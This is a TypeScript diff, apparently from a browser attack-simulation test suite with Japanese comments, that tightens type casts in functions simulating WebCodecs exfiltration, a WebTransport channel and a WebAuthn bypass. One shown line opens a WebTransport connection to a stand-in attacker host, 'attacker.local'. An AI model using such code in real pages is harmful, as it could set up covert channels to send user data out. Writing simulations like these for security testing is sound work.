@@ -190,18 +190,22 @@ async function simulateWebCodecsExfiltration(): Promise<AttackResult> {
 
     try {
       // VideoEncoder の初期化
-      const config: any = {
+      const config = {
         codec: "vp09.00.10.08",
         width: 640,
         height: 480,
         bitrate: 1000000,
       };
 
-      const encoder = new (window as any).VideoEncoder({
-        output: (chunk: any) => {
+      const VideoEncoder = (window as unknown as Record<string, unknown>).VideoEncoder as unknown;
+      const encoder = new (VideoEncoder as new (options: {
+        output: (chunk: unknown) => void;
+        error: (error: unknown) => void;
+      }) => unknown)({
+        output: (chunk: unknown) => {
           codecsAccessible = true;
         },
-        error: (error: any) => {
+        error: (error: unknown) => {
           // エラーハンドル
         },
       });
@@ -224,10 +228,11 @@ async function simulateWebCodecsExfiltration(): Promise<AttackResult> {
 
         // VideoFrame を作成
         try {
-          const frame = new (window as any).VideoFrame(canvas, {
+          const VideoFrame = (window as unknown as Record<string, unknown>).VideoFrame as unknown;
+          const frame = new (VideoFrame as new (source: CanvasImageSource, options: { timestamp: number }) => unknown)(canvas, {
             timestamp: 0,
           });
-          encoder.encode(frame);
+          (encoder as unknown as { encode: (frame: unknown) => void }).encode(frame);
         } catch (e) {
           // Frame creation failed
         }
@@ -281,9 +286,10 @@ async function simulateWebTransportP2P(): Promise<AttackResult> {
 
     try {
       // WebTransport 接続を試みる（攻撃者サーバーへ）
-      const transport = new (window as any).WebTransport(
+      const WebTransport = (window as unknown as Record<string, unknown>).WebTransport as unknown;
+      const transport = new (WebTransport as new (url: string) => unknown)(
         "https://attacker.local:443"
-      );
+      ) as unknown as { ready: Promise<void>; createBidirectionalStream: () => Promise<unknown> };
 
       // 接続確立を待つ
       await Promise.race([
@@ -373,11 +379,11 @@ async function simulateWebAuthnBypass(): Promise<AttackResult> {
             name: "admin",
             displayName: "Administrator",
           },
-          pubKeyCredParams: [{ alg: -7, type: "public-key" }],
+          pubKeyCredParams: [{ alg: -7, type: "public-key" } as PublicKeyCredentialParameters],
           timeout: 60000,
-          attestation: "none",
-        } as any,
-      } as any);
+          attestation: "none" as AttestationConveyancePreference,
+        } as CredentialCreationOptions,
+      });
 
       if (credential) {
         authBypassAttempted = true;
